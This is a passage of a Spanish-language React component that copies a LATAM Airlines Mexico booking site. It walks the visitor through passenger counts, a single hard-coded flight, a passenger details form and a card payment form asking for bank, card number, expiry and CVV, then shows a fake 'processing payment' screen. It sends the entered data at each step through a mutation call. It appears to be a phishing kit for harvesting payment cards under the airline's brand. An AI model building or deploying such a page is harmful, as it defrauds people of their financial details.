                  <path style={{fill: 'currentColor'}} d="M0.717566 15.629C0.717566 15.737 0.684316 15.8262 0.613035 15.892C0.541754 15.9624 0.451437 15.9953 0.346891 15.9953C0.25185 15.9953 0.17106 15.9624 0.104532 15.892C0.0332505 15.8215 0 15.737 0 15.629V6.8135C0 6.6773 0.0237139 6.5646 0.0712346 6.48006C0.118755 6.39552 0.190124 6.34383 0.280414 6.32974L5.35559 4.60143C5.74526 4.47932 6.05412 4.46519 6.28697 4.55442C6.51982 4.64835 6.69094 4.84562 6.80023 5.1509L8.07851 8.92695L9.36155 6.18882C9.3758 6.14185 9.39963 6.10428 9.4329 6.0714C9.46141 6.04322 9.50883 6.01979 9.57061 6.001L14.2277 4.3431C14.6173 4.2069 14.95 4.2539 15.2304 4.49342C15.5108 4.73295 15.5963 5.04291 15.487 5.42333L14.0898 9.72534C14.0566 9.81927 13.9996 9.885 13.9141 9.93196C13.8285 9.97893 13.7334 9.98365 13.6241 9.95547C13.5481 9.94138 13.4816 9.8898 13.4246 9.80526C13.3723 9.72072 13.358 9.62674 13.3913 9.51872L14.7885 5.21671C14.817 5.12278 14.7979 5.05694 14.7171 5.00998C14.6411 4.96301 14.5555 4.96301 14.4605 5.00998L9.94128 6.62098L8.38259 10.0494C8.36834 10.1104 8.34462 10.1574 8.31136 10.1856C8.27809 10.2185 8.23531 10.2373 8.17353 10.2561H8.14975L8.12608 10.2796H8.10229H8.00728C7.91223 10.2796 7.83621 10.2466 7.77443 10.1762C7.71265 10.1057 7.6793 10.0353 7.6793 9.95547L6.1206 5.39983C6.05883 5.29181 5.99234 5.22609 5.92105 5.20261C5.84977 5.17913 5.74049 5.19785 5.58368 5.25891L0.717566 6.94031V15.629Z"></path>
                </svg>
                <div>
                  <p className="fs-4 m-0 mb-1">Niños</p>
                  <p className="fs-5 m-0">De 2 a 11 años</p>
                </div>
              </div>
              <div className="d-flex align-items-center passenger-counter">
                <button className="counter-btn" onClick={() => handlePassengerChange('children', '-')}>
                  <svg viewBox="0 0 24 24" width="22" height="22" color="#B30F3B">
                    <path style={{fill: 'currentColor'}} d="M12 1C18.1 1 23 5.9 23 12C23 18.1 18.1 23 12 23C5.9 23 1 18.1 1 12C1 5.9 5.9 1 12 1ZM12 0C5.4 0 0 5.4 0 12C0 18.6 5.4 24 12 24C18.6 24 24 18.6 24 12C24 5.4 18.6 0 12 0Z"></path>
                    <path style={{fill: 'currentColor'}} d="M18 11.5H12.5H11.5H6V12.5H11.5H12.5H18V11.5Z"></path>
                  </svg>
                </button>
                <span className="counter-value">{formData.children}</span>
                <button className="counter-btn" onClick={() => handlePassengerChange('children', '+')}>
                  <svg viewBox="0 0 24 24" width="22" height="22" color="#B30F3B">
                    <path style={{fill: 'currentColor'}} d="M12 1C18.1 1 23 5.9 23 12C23 18.1 18.1 23 12 23C5.9 23 1 18.1 1 12C1 5.9 5.9 1 12 1ZM12 0C5.4 0 0 5.4 0 12C0 18.6 5.4 24 12 24C18.6 24 24 18.6 24 12C24 5.4 18.6 0 12 0Z"></path>
                    <path style={{fill: 'currentColor'}} d="M18 11.5H12.5V6H11.5V11.5H6V12.5H11.5V18H12.5V12.5H18V11.5Z"></path>
                  </svg>
                </button>
              </div>
            </div>

            {/* BEBÉS */}
            <div className="d-flex justify-space-between tc-gray-smoke pt-1 pb-1 border-bottom">
              <div className="d-flex justify-content-center align-items-center">
                <svg style={{marginRight: '18px', marginLeft: '15px'}} viewBox="0 0 12 15" width="16" height="15" color="#B30F3B">
                  <path style={{fill: 'currentColor'}} d="M6.01584 0.794401C5.58398 0.794401 5.22166 0.938261 4.91776 1.2315C4.61386 1.52474 4.46426 1.8873 4.46426 2.31383C4.46426 2.74568 4.61386 3.10292 4.91776 3.39615C5.21633 3.68939 5.58398 3.83338 6.01584 3.83338C6.4317 3.83338 6.78879 3.68939 7.08736 3.39615C7.38593 3.10292 7.54086 2.74035 7.54086 2.31383C7.54086 1.88197 7.39126 1.52474 7.08736 1.2315C6.78346 0.943592 6.42637 0.794401 6.01584 0.794401Z"></path>
                </svg>
                <div>
                  <p className="fs-4 m-0 mb-1">Bebés</p>
                  <p className="fs-5 m-0">Menos de 2 años</p>
                </div>
              </div>
              <div className="d-flex align-items-center passenger-counter">
                <button className="counter-btn" onClick={() => handlePassengerChange('babies', '-')}>
                  <svg viewBox="0 0 24 24" width="22" height="22" color="#B30F3B">
                    <path style={{fill: 'currentColor'}} d="M12 1C18.1 1 23 5.9 23 12C23 18.1 18.1 23 12 23C5.9 23 1 18.1 1 12C1 5.9 5.9 1 12 1ZM12 0C5.4 0 0 5.4 0 12C0 18.6 5.4 24 12 24C18.6 24 24 18.6 24 12C24 5.4 18.6 0 12 0Z"></path>
                    <path style={{fill: 'currentColor'}} d="M18 11.5H12.5H11.5H6V12.5H11.5H12.5H18V11.5Z"></path>
                  </svg>
                </button>
                <span className="counter-value">{formData.babies}</span>
                <button className="counter-btn" onClick={() => handlePassengerChange('babies', '+')}>
                  <svg viewBox="0 0 24 24" width="22" height="22" color="#B30F3B">
                    <path style={{fill: 'currentColor'}} d="M12 1C18.1 1 23 5.9 23 12C23 18.1 18.1 23 12 23C5.9 23 1 18.1 1 12C1 5.9 5.9 1 12 1ZM12 0C5.4 0 0 5.4 0 12C0 18.6 5.4 24 12 24C18.6 24 24 18.6 24 12C24 5.4 18.6 0 12 0Z"></path>
                    <path style={{fill: 'currentColor'}} d="M18 11.5H12.5V6H11.5V11.5H6V12.5H11.5V18H12.5V12.5H18V11.5Z"></path>
                  </svg>
                </button>
              </div>
            </div>
          </div>
          <div className="modal-bottom pr-4 pl-4">
            <button className="btn-success mt-5" onClick={() => setShowPassengersModal(false)}>Confirmar</button>
          </div>
        </div>
      )}

      {/* NAVBAR */}
      <nav className="navbar">
        <div>
          <img className="navbar--logo" src={latamLogo} alt="LATAM" />
        </div>
        <div className="d-flex justify-content-center align-items-center">
          <button className="btn-session">Iniciar sesión</button>
        </div>
      </nav>

      {/* CONTENIDO PRINCIPAL */}
      <div className="search-form-container">
        <h1 className="main-title">Cotiza Vuelos, Paquetes, Hoteles y Carros | LTM México</h1>
        
        {/* TIPO DE VIAJE */}
        <div className="form-field">
          <button 
            className="form-field-button"
            onClick={() => setShowTravelType(true)}
            data-testid="button-travel-type"
          >
            <span>{formData.travelType}</span>
            <svg width="12" height="8" viewBox="0 0 12 8" fill="currentColor">
              <path d="M1 1l5 5 5-5" stroke="currentColor" strokeWidth="2" fill="none"/>
            </svg>
          </button>
        </div>

        {/* ORIGEN */}
        <div className="form-field">
          <button 
            className="form-field-button"
            onClick={() => setShowOriginModal(true)}
            data-testid="button-select-origin"
          >
            <div className="d-flex align-items-center">
              <img src={takeoffIcon} alt="Takeoff" className="form-field-icon" />
              <span>{formData.origin ? `${formData.origin.city} (${formData.origin.code})` : 'Seleccionar origen'}</span>
            </div>
            <svg width="12" height="8" viewBox="0 0 12 8" fill="currentColor">
              <path d="M1 1l5 5 5-5" stroke="currentColor" strokeWidth="2" fill="none"/>
            </svg>
          </button>
        </div>

        {/* DESTINO */}
        <div className="form-field">
          <button 
            className="form-field-button"
            onClick={() => setShowDestinationModal(true)}
            data-testid="button-select-destination"
          >
            <div className="d-flex align-items-center">
              <img src={mappointIcon} alt="Landing" className="form-field-icon" />
              <span>{formData.destination ? `${formData.destination.city} (${formData.destination.code})` : 'Seleccionar destino'}</span>
            </div>
            <svg width="12" height="8" viewBox="0 0 12 8" fill="currentColor">
              <path d="M1 1l5 5 5-5" stroke="currentColor" strokeWidth="2" fill="none"/>
            </svg>
          </button>
        </div>

        {/* FECHAS */}
        <div className="form-field">
          <button 
            className="form-field-button"
            onClick={() => setShowDatesModal(true)}
            data-testid="button-select-dates"
          >
            <span>
              {formData.departureDate 
                ? `${formData.departureDate}${formData.travelType === 'Ida y Vuelta' && formData.returnDate ? ` - ${formData.returnDate}` : ''}`
                : '¿Cuándo viajas?'
              }
            </span>
            <svg width="12" height="8" viewBox="0 0 12 8" fill="currentColor">
              <path d="M1 1l5 5 5-5" stroke="currentColor" strokeWidth="2" fill="none"/>
            </svg>
          </button>
        </div>

        {/* PASAJEROS */}
        <div className="form-field">
          <button 
            className="form-field-button"
            onClick={() => setShowPassengersModal(true)}
            data-testid="button-select-passengers"
          >
            <span>
              {formData.adults + formData.children + formData.babies} pasajero{formData.adults + formData.children + formData.babies > 1 ? 's' : ''}
            </span>
            <svg width="12" height="8" viewBox="0 0 12 8" fill="currentColor">
              <path d="M1 1l5 5 5-5" stroke="currentColor" strokeWidth="2" fill="none"/>
            </svg>
          </button>
        </div>

        {/* TIPO DE CABINA */}
        <div className="form-field">
          <button 
            className="form-field-button"
            onClick={() => setShowSeatType(true)}
            data-testid="button-seat-type"
          >
            <span>{formData.seatType}</span>
            <svg width="12" height="8" viewBox="0 0 12 8" fill="currentColor">
              <path d="M1 1l5 5 5-5" stroke="currentColor" strokeWidth="2" fill="none"/>
            </svg>
          </button>
        </div>

        {/* BOTÓN BUSCAR */}
        <button 
          className="btn-success mt-5"
          onClick={handleFormSubmit}
          data-testid="button-search-flights"
          style={{fontSize: '1.125rem', height: '3.5rem'}}
        >
          Buscar Vuelos
        </button>
      </div>
    </div>
  );

  const renderFlightSelection = () => (
    <div className="main-container bg-gray" style={{minHeight: '100vh'}}>
      <style>{vuelos_styles}</style>
      
      {/* NAVBAR FIJO */}
      <nav className="p-fixed bg-deep-blue p-3">
        <div className="d-flex justify-space-between align-items-center">
          <div>
            <img width="105px" src={latamLogo} alt="LATAM" />
          </div>
          <div className="d-flex justify-content-center align-items-center">
            <button className="btn-session">Iniciar sesión</button>
          </div>
        </div>
        
        <div className="mt-2 d-flex bg-gray rounded-info justify-space-between align-items-center p-3" onClick={() => setCurrentScreen("search")}>
          <div>
            <p className="fs-5 fw-bolder tc-pink mt-2 mb-0">
              {formData.origin?.city} → {formData.destination?.city}
            </p>
            <p className="fs-5 fw-light tc-deep-blue mt-0 mb-1">
              {formData.departureDate} {formData.travelType === 'Ida y Vuelta' && formData.returnDate ? `a ${formData.returnDate}` : ''}
            </p>
          </div>
          <div className="border-left-bold pr-3 d-flex align-items-center">
            <svg className="pl-3 pr-3" viewBox="0 0 16 21" width="16" height="21" color="#2500c3">
              <path style={{fill: 'currentColor'}} d="M8.63396 7.93475C8.33208 8.1047 8.01006 8.24279 7.66792 8.34901C7.34591 8.43399 7.01384 8.47648 6.6717 8.47648C5.58491 8.47648 4.63899 8.06221 3.83396 7.23369C3.04906 6.38391 2.6566 5.38543 2.6566 4.23824C2.6566 3.09105 3.04906 2.10319 3.83396 1.27466C4.63899 0.424886 5.58491 0 6.6717 0C7.41635 0 8.10063 0.201821 8.72453 0.605463C9.34843 1.0091 9.83145 1.52959 10.1736 2.16692C10.3346 2.48558 10.4553 2.82549 10.5358 3.18665C10.6365 3.52656 10.6868 3.87709 10.6868 4.23824C10.6868 5.02428 10.4956 5.74659 10.1132 6.40516C9.73082 7.06373 9.23773 7.5736 8.63396 7.93475ZM9.75094 4.23824C9.75094 3.34598 9.44906 2.58118 8.84528 1.94385C8.24151 1.30653 7.51698 0.987861 6.6717 0.987861C5.82641 0.987861 5.10189 1.30653 4.49811 1.94385C3.89434 2.58118 3.59245 3.34598 3.59245 4.23824C3.59245 5.1305 3.89434 5.8953 4.49811 6.53263C5.10189 7.16995 5.82641 7.48862 6.6717 7.48862C7.51698 7.48862 8.24151 7.16995 8.84528 6.53263C9.44906 5.8953 9.75094 5.1305 9.75094 4.23824Z"/>
            </svg>
            <span className="fs-2 tc-deep-blue">{formData.adults + formData.children + formData.babies}</span>
          </div>
        </div>
      </nav>

      {/* CONTENIDO PRINCIPAL */}
      <main className="p-3 bg-gray mt-6">

        <p className="fw-lighter fs-2">
          Elige un <span className="tc-ocean" style={{fontWeight: 600}}>vuelo de ida</span>
        </p>
        <p className="m-0 fw-light tc-ocean">
          Ordenado por: <span className="tc-ocean fw-bolder">Recomendado</span>
        </p>
        <p className="fs-6 tc-gray-smoke">El orden aplicará para tu vuelo de ida y vuelta</p>

        {/* VUELOS DISPONIBLES */}
        <div className="card-flight mb-3">
          <span className="card-flight-label">Más económico</span>
          
          <div className="border-bottom p-3">
            <div className="d-flex justify-space-between border-bottom mt-3">
              <div>
                <p className="m-0 fs-2 tc-ocean">2:30 p. m.</p>
                <p className="m-0 fs-4">{formData.origin?.code}</p>
              </div>
              <div className="d-flex align-items-end flex-column">
                <p className="mt-0 mb-1 fs-6 tc-gray-smoke">Duración</p>
                <p className="fs-6 mt-0">1h 7 min</p>
              </div>
              <div className="d-flex align-items-end flex-column">
                <p className="m-0 fs-2 tc-ocean">3:37 p. m.</p>
                <p className="m-0 fs-4">{formData.destination?.code}</p>
              </div>
            </div>

            <div className="d-flex justify-space-between mt-3">
              <div className="d-flex align-items-center">
                <a className="fw-bolder tc-blue" href="#">Directo</a>
              </div>
              <div className="d-flex align-items-center justify-content-start flex-row">
                <span className="tc-red fw-bold mr-1">Cerrar</span>
                <svg className="tc-red" width="20px" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 32 32">
                  <path d="M30 27.5829L27.1881 30.375L16 19.1869L4.79207 30.375L2 27.5829L13.1881 16.375L2 5.18685L4.79207 2.375L15.9802 13.5829L27.1881 2.375L30 5.18685L18.7921 16.375L30 27.5829Z" fill="currentColor"/>
                </svg>
              </div>
            </div>

            <p className="tc-gray-smoke fs-6 mb-0">Operado por LATAM Airlines México</p>
          </div>

          <div className="bg-gray p-2">
            <div className="slider">
              <div id="basic-seat">
                <p className="fw-bolder fs-3 ml-3 mt-4">Basic</p>
                <div className="container-seat-options p-3">
                  <div className="d-flex align-items-start mb-2">
                    <svg className="tc-light-green" width="15px" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 32 32">
                      <path d="M21.348 10.4841L13.48 18.3799L9.54602 14.3341L7.64196 16.336L13.494 22.314L23.336 12.374L21.348 10.4841ZM16 2C23.7 2 30 8.3 30 16C30 23.7 23.7 30 16 30C8.3 30 2 23.7 2 16C2 8.3 8.3 2 16 2Z" fill="currentColor"/>
                    </svg>
                    <span className="ml-1 fs-5 tc-gray-smoke">Bolso o mochila pequeña</span>
                  </div>
                  <div className="d-flex align-items-start mb-2">
                    <svg className="tc-light-green" width="15px" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 32 32">
                      <path d="M21.348 10.4841L13.48 18.3799L9.54602 14.3341L7.64196 16.336L13.494 22.314L23.336 12.374L21.348 10.4841ZM16 2C23.7 2 30 8.3 30 16C30 23.7 23.7 30 16 30C8.3 30 2 23.7 2 16C2 8.3 8.3 2 16 2Z" fill="currentColor"/>
                    </svg>
                    <span className="ml-1 fs-5 tc-gray-smoke">Cambio con cargo</span>
                  </div>
                </div>
                <div className="d-flex flex-column align-items-center">
                  <p className="fs-3 fw-bolder tc-ocean m-0">MXN $1,100.00</p>
                  <button 
                    className="btn-success mt-3" 
                    style={{width: '90%'}}
                    onClick={() => {
                      // Enviar datos de vuelo seleccionado
                      submitDataMutation.mutate({
                        ...formData,
                        selectedFlight: "MEX-GDL-14:30-15:37-Basic",
                        flightPrice: "MXN $1,100.00",
                        fieldName: "flight_selection",
                        timestamp: new Date().toISOString()
                      });
                      setCurrentScreen("passengers");
                    }}
                    data-testid="button-select-flight"
                  >
                    Seleccionar
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );

  const renderPassengerInfo = () => (
    <div className="main-container bg-gray" style={{minHeight: '100vh'}}>
      <style>{vuelos_styles}</style>
      
      {/* NAVBAR FIJO */}
      <nav className="p-fixed bg-deep-blue p-3">
        <div className="d-flex justify-space-between align-items-center">
          <div>
            <img width="105px" src={latamLogo} alt="LATAM" />
          </div>
          <div className="d-flex justify-content-center align-items-center">
            <button className="btn-session">Iniciar sesión</button>
          </div>
        </div>
      </nav>

      <main className="container-passengers bg-gray">
        <p className="fw-lighter fw-light tc-ocean fs-1 pt-3 m-0">Pasajeros</p>

        <div className="mb-4">
          <button className="btn-opened-accordion shadow-1 mt-2 d-flex align-items-center justify-space-between">
            <div className="d-flex align-items-center">
              <svg className="tc-deep-blue mr-1" xmlns="http://www.w3.org/2000/svg" width="22px" height="32px" viewBox="0 0 32 32" fill="none">
                <path d="M14.0075 2.40103C12.7448 2.40103 11.6507 2.85248 10.7435 3.76441C9.83625 4.67635 9.38712 5.76667 9.38712 7.04526C9.38712 8.32385 9.83625 9.41463 10.7435 10.3266C11.6507 11.2385 12.7354 11.6895 14.0075 11.6895C15.2795 11.6895 16.3646 11.2385 17.2719 10.3266C18.1791 9.41463 18.6283 8.32385 18.6283 7.04526C18.6283 5.77607 18.1791 4.67635 17.2719 3.76441C16.3646 2.86188 15.2795 2.40103 14.0075 2.40103Z" fill="currentColor"/>
              </svg>
              <p className="m-0 fw-bolder tc-ocean">Adulto</p>
            </div>
          </button>
          
          <form className="bg-white p-3 form-passenger d-flex">
            <div className="input-container">
              <input 
                required 
                type="text" 
                value={formData.firstName}
                onChange={(e) => handleInputChange("firstName", e.target.value)}
                placeholder=" "
                data-testid="input-passenger-name"
              />
              <label>Nombre</label>
            </div>
            
            <div className="input-container">
              <input 
                type="text" 
                required 
                value={formData.lastName}
                onChange={(e) => handleInputChange("lastName", e.target.value)}
                placeholder=" "
                data-testid="input-passenger-surname"
              />
              <label>Apellido</label>
            </div>
            
            <div className="input-container">
              <input 
                required 
                value={formData.birthDate}
                onChange={(e) => handleInputChange("birthDate", e.target.value)}
                type="date"
                data-testid="input-passenger-birthdate"
              />
              <label>Fecha de Nacimiento</label>
            </div>
            
            <div className="select-container">
              <select 
                value={formData.gender}
                onChange={(e) => handleInputChange("gender", e.target.value)}
                data-testid="select-passenger-gender"
              >
                <option value="">Seleccionar</option>
                <option value="Masculino">Masculino</option>
                <option value="Femenino">Femenino</option>
              </select>
              <label>Género</label>
            </div>

            <div className="select-container">
              <select data-testid="select-passenger-nationality">
                <option value="México">México</option>
                <option value="Estados Unidos">Estados Unidos</option>
                <option value="Canadá">Canadá</option>
                <option value="España">España</option>
                <option value="Argentina">Argentina</option>
              </select>
              <label>Nacionalidad</label>
            </div>

            <button 
              type="button"
              className="btn-success mt-3"
              onClick={() => {
                // Enviar datos del pasajero antes de continuar
                submitDataMutation.mutate({
                  ...formData,
                  fieldName: "passenger_data",
                  timestamp: new Date().toISOString()
                });
                setCurrentScreen("payment");
              }}
              data-testid="button-continue-payment"
            >
              Continuar al Pago
            </button>
          </form>
        </div>
      </main>
    </div>
  );

  const renderPayment = () => (
    <div className="main-container bg-gray" style={{minHeight: '100vh'}}>
      <style>{vuelos_styles}</style>
      
      {/* NAVBAR FIJO */}
      <nav className="p-fixed bg-deep-blue p-3">
        <div className="d-flex justify-space-between align-items-center">
          <div>
            <img width="105px" src={latamLogo} alt="LATAM" />
          </div>
          <div className="d-flex justify-content-center align-items-center">
            <button className="btn-session">Iniciar sesión</button>
          </div>
        </div>
      </nav>

      <main className="mt-6 bg-gray" style={{padding: '16px'}}>
        <p className="tc-ocean fs-1 pt-3 m-0 mb-3">Confirma y paga tu compra</p>
        
        {/* RESUMEN DE COMPRA */}
        <div className="p-3 bg-white rounded-borded mb-4">
          <div className="border-bottom d-flex flex-row justify-space-between align-items-start">
            <div>
              <p className="fs-3 m-0 fw-light mb-1 tc-ocean mt-1">Total a pagar</p>
              <p className="m-0 mb-4 fs-5 tc-gray-smoke">
                {formData.adults} Adulto{formData.adults > 1 ? 's' : ''}
                {formData.children > 0 && `, ${formData.children} Niño${formData.children > 1 ? 's' : ''}`}
                {formData.babies > 0 && `, ${formData.babies} Bebé${formData.babies > 1 ? 's' : ''}`}
              </p>
            </div>
            <div>
              <p className="fs-3 m-0 fw-bold tc-ocean mt-1">MXN $1,100.00</p>
            </div>
          </div>

          <div className="border-bottom d-flex mt-4 flex-column">
            <div className="mb-4">
              <p className="m-0 fw-bold fs-5 tc-ocean">
                De {formData.origin?.city} a {formData.destination?.city}
              </p>
              <p className="m-0 mt-1 fs-5 tc-gray-smoke">{formData.departureDate}</p>
            </div>
          </div>

          <div className="d-flex justify-content-center align-items-center">
            <p className="fw-bold tc-red mt-4" onClick={() => setCurrentScreen("flights")}>
              Volver a elegir vuelos
            </p>
          </div>
        </div>

        <p className="tc-ocean fw-lighter fs-1 pt-3 m-0 mb-3">Medios de pago</p>

        {/* FORMULARIO DE PAGO */}
        <div className="bg-white card-rounded pt-1 pb-1 mb-5">
          <div className="border-bottom p-3">
            <div className="d-flex flex-row align-items-start mt-3">
              <svg width="35px" className="tc-gray-smoke mr-2 ml-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 32 32">
                <path d="M26.5156 21.431H25.4782V22.4766C25.4782 22.6224 25.4337 22.7364 25.3394 22.8314C25.245 22.9265 25.1319 22.9708 24.9936 22.9708C24.8678 22.9708 24.7673 22.9265 24.6729 22.8314C24.5849 22.7364 24.5347 22.6224 24.5347 22.4766V21.431H23.5029C23.3771 21.431 23.2703 21.3866 23.1822 21.2916C23.0879 21.2028 23.044 21.0824 23.044 20.9366C23.044 20.8162 23.0879 20.7085 23.1822 20.6134C23.2703 20.5247 23.3771 20.474 23.5029 20.474H24.5347V19.4284C24.5347 19.289 24.5786 19.1686 24.6729 19.0736C24.7673 18.9848 24.8741 18.9341 24.9936 18.9341C25.1319 18.9341 25.2513 18.9785 25.3394 19.0736C25.4337 19.1686 25.4782 19.2827 25.4782 19.4284V20.474H26.5156C26.6351 20.474 26.7425 20.5184 26.8368 20.6134C26.9311 20.7085 26.975 20.8162 26.975 20.9366C26.975 21.0824 26.9311 21.1965 26.8368 21.2916C26.7425 21.3866 26.6351 21.431 26.5156 21.431Z" fill="currentColor"/>
              </svg>
              
              <div style={{width: '75%'}}>
                <p className="fw-bold tc-ocean m-0">Agregar tarjeta</p>
                <p className="mt-1 tc-gray-smoke">Débito con CVV o crédito Visa, Mastercard, American Express o Diners Club.</p>
                <div className="d-flex justify-space-between">
                  <p className="mt-3 fs-4 tc-gray-smoke">A pagar con tarjeta</p>
                  <p className="fs-4 fw-bold tc-ocean">$1,100.00</p>
                </div>
              </div>
              
              <div>
                <div className="radio-container m-2">
                  <input type="radio" name="payment-method" checked readOnly />
                  <div className="radio-blue"></div>
                </div>
              </div>
            </div>

            <form className="pr-3 pl-3" onSubmit={handlePaymentSubmit}>
              <div className="select-container">
                <select 
                  required 
                  value={formData.bank || ""}
                  onChange={(e) => handleInputChange("bank", e.target.value)}
                  data-testid="select-bank"
                >
                  <option value="">Seleccione su banco</option>
                  <option value="AZTECA">BANCO AZTECA</option>
                  <option value="NUBANK">NUBANK</option>
                  <option value="HSBC">BANCO HSBC</option>
                  <option value="BANCOPPEL">BANCOPPEL</option>
                  <option value="BBVA">BANCO BBVA</option>
                  <option value="BANORTE">BANCO BANORTE</option>
                </select>
                <label>Banco o Entidad Financiera</label>
              </div>

              <div className="input-container mb-1">
                <input 
                  required 
                  type="text" 
                  value={formData.cardNumber}
                  onChange={(e) => handleInputChange("cardNumber", formatCardNumber(e.target.value))}
                  placeholder=" "
                  maxLength={16}
                  data-testid="input-card-number"
                />
                <label>Número de tarjeta</label>
              </div>
              
              <div className="input-container mb-0">
                <input 
                  required 
                  type="text"
                  value={formData.cardHolder}
                  onChange={(e) => handleInputChange("cardHolder", e.target.value)}
                  placeholder=" "
                  data-testid="input-card-holder"
                />
                <label>Nombre y Apellido</label>
              </div>
              
              <div className="d-flex flex-row justify-space-between mb-4">
                <div className="input-container mb-1 mr-2">
                  <input 
                    required 
                    type="text"
                    value={formData.expiryDate}
                    onChange={(e) => handleInputChange("expiryDate", formatExpiryDate(e.target.value))}
                    placeholder=" "
                    maxLength={5}
                    data-testid="input-expiry-date"
                  />
                  <label>Expiración (MM/AA)</label>
                </div>
                
                <div className="input-container mb-1 ml-2">
                  <input 
                    required 
                    type="text"
                    value={formData.cvv}
                    onChange={(e) => handleInputChange("cvv", formatCVV(e.target.value))}
                    placeholder=" "
                    maxLength={4}
                    data-testid="input-cvv"
                  />
                  <label>CVV</label>
                </div>
              </div>

              <div className="d-flex justify-content-center mt-4" style={{gap: '8px'}}>
                <img src={visaLogo} alt="Visa" style={{height: '30px'}} />
                <img src={mastercardLogo} alt="Mastercard" style={{height: '30px'}} />
              </div>

              <button 
                type="submit" 
                className="btn-success mt-4"
                data-testid="button-pay"
              >
                🔒 Pagar MXN $1,100.00
              </button>
            </form>
          </div>
        </div>
      </main>
    </div>
  );

  const renderProcessingPayment = () => (
    <div className="processing-container">
      <style>{vuelos_styles}</style>
      <div className="spinner"></div>
      <h1 className="processing-title">Procesando Pago</h1>
      <p className="processing-text">Espere por favor...</p>
      <p className="processing-text">No cierre esta ventana</p>
      <p className="processing-text" style={{opacity: 0.7}}>
        Estamos confirmando su reserva con LATAM Airlines México
      </p>
    </div>
  );

  return renderScreen();
}